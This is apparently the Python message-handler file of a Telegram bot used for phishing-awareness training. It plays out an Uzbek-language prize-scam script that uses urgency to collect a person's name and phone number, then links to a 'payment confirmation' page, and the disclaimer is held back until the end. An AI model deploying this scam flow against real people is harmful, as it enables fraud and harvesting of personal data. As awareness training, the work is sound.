"""
Bot message handlers — realistic scam flow until final reveal.
Educational disclaimer shown ONLY after web simulation completes.
"""

import logging
from urllib.parse import quote

from aiogram import Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, Message

from bot.keyboards import (
    continue_simulation_keyboard,
    phone_request_keyboard,
    remove_keyboard,
)
from bot.services.api_client import create_training_session, fetch_tunnel_status
from bot.states import TrainingFlow

logger = logging.getLogger(__name__)
router = Router()

SCAM_WELCOME = """
🎉 <b>Tabriklaymiz!</b> 🎉

Siz quyidagi sovrinlardan birini yutib olish imkoniyatiga ega bo'ldingiz:

🚗 <b>BYD Champion</b>
📱 <b>iPhone 17</b>
💰 <b>5 000 000 UZS</b>
🏠 <b>Kvartira</b>
🚙 <b>Hashtabshar avtomobil</b>

⏰ <b>Mukofotni olish uchun 24 soat ichida ro'yxatdan o'ting!</b>

Ro'yxatdan o'tish uchun ma'lumotlaringizni kiriting.

👤 <b>To'liq ismingiz</b>
"""

ABOUT_TEXT = """
🛡️ <b>Cyber Hygiene Awareness Training</b>

Bu bot <b>ta'lim simulyatsiyasi</b> uchun mo'ljallangan.

Ishtirochilar uchun simulyatsiya real ko'rinadi — ogohlantirish faqat oxirida chiqadi.

<b>Haqiqiy ma'lumotlar yig'ilmaydi.</b>
"""


@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(SCAM_WELCOME)
    await message.answer("Iltimos, <b>to'liq ismingizni</b> kiriting:")
    await state.set_state(TrainingFlow.waiting_for_name)


@router.message(Command("about"))
async def cmd_about(message: Message):
    await message.answer(ABOUT_TEXT)


@router.message(Command("status"))
async def cmd_status(message: Message):
    """Instructor: tunnel and platform status."""
    status = await fetch_tunnel_status()
    if not status:
        await message.answer(
            "⚠️ <b>Backend ulanmagan</b>\n\n"
            "<code>bash scripts/start-training.sh</code>"
        )
        return

    public = status.get("public_url") or status.get("base_url", "—")
    tunnel_type = status.get("tunnel_type", "none")
    active = "✅ Faol" if status.get("active") else "📍 Mahalliy"

    await message.answer(
        "📡 <b>Platforma holati (instruktor)</b>\n\n"
        f"🌐 <b>Havola:</b>\n<code>{public}</code>\n\n"
        f"🔗 <b>Tunnel:</b> {tunnel_type}\n"
        f"📶 <b>Status:</b> {active}\n\n"
        f"🏠 <code>{status.get('local_url', 'http://127.0.0.1:8000')}</code>"
    )


@router.message(Command("tunnel"))
async def cmd_tunnel(message: Message):
    await message.answer(
        "🔧 <b>Tunnel (instruktor)</b>\n\n"
        "<code>bash scripts/start-training.sh</code>\n\n"
        "1️⃣ LocalHost\n2️⃣ Ngrok\n3️⃣ Serveo\n4️⃣ Localhost.run"
    )


@router.callback_query(F.data == "restart")
async def callback_restart(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.answer(SCAM_WELCOME)
    await callback.message.answer("Iltimos, <b>to'liq ismingizni</b> kiriting:")
    await state.set_state(TrainingFlow.waiting_for_name)
    await callback.answer()


@router.message(TrainingFlow.waiting_for_name)
async def process_name(message: Message, state: FSMContext):
    name = (message.text or "").strip()
    if len(name) < 2 or len(name) > 100:
        await message.answer("Iltimos, to'g'ri ism kiriting (kamida 2 harf):")
        return
    await state.update_data(display_name=name)
    await message.answer(
        f"Rahmat, <b>{name}</b>!\n\n"
        "Endi <b>telefon raqamingizni</b> kiriting — mukofot shu raqamga bog'lanadi.\n\n"
        "📱 Quyidagi tugmadan foydalaning yoki qo'lda yozing.",
        reply_markup=phone_request_keyboard(),
    )
    await state.set_state(TrainingFlow.waiting_for_phone)


@router.message(TrainingFlow.waiting_for_phone, F.contact)
async def process_phone_contact(message: Message, state: FSMContext):
    phone = message.contact.phone_number if message.contact else ""
    await _finish_registration(message, state, phone)


@router.message(TrainingFlow.waiting_for_phone, F.text == "✏️ Raqamni qo'lda yozish")
async def process_phone_manual_prompt(message: Message):
    await message.answer(
        "Telefon raqamingizni kiriting:",
        reply_markup=remove_keyboard(),
    )


@router.message(TrainingFlow.waiting_for_phone)
async def process_phone_text(message: Message, state: FSMContext):
    phone = (message.text or "").strip()
    if len(phone) < 5:
        await message.answer("Iltimos, to'g'ri telefon raqam kiriting:")
        return
    await _finish_registration(message, state, phone)


async def _finish_registration(message: Message, state: FSMContext, phone: str):
    data = await state.get_data()
    name = data.get("display_name", "Ishtirokchi")
    user_id = message.from_user.id if message.from_user else 0

    session_data = await create_training_session(user_id)
    if not session_data:
        await message.answer(
            "⚠️ Server vaqtincha ishlamayapti. Keyinroq /start buyrug'ini yuboring.",
            reply_markup=remove_keyboard(),
        )
        await state.clear()
        return

    token = session_data["token"]
    base_url = session_data["simulation_url"].split("?")[0]
    fragment = f"name={quote(name)}&phone={quote(phone)}"
    simulation_url = f"{base_url}?token={token}#{fragment}"

    await message.answer(
        "✅ <b>Ro'yxatdan o'tish muvaffaqiyatli yakunlandi!</b>\n\n"
        f"Hurmatli <b>{name}</b>, sizning arizangiz qabul qilindi.\n\n"
        "Mukofotingizni olish uchun quyidagi tugmani bosing va "
        "to'lovni tasdiqlash sahifasiga o'ting.\n\n"
        "⏰ <b>Diqqat:</b> vaqt cheklangan — tezroq harakat qiling!",
        reply_markup=remove_keyboard(),
    )
    await message.answer(
        "👇 Mukofotni olish uchun bosing:",
        reply_markup=continue_simulation_keyboard(simulation_url),
    )
    await state.clear()


def register_handlers(dp: Dispatcher) -> None:
    dp.include_router(router)
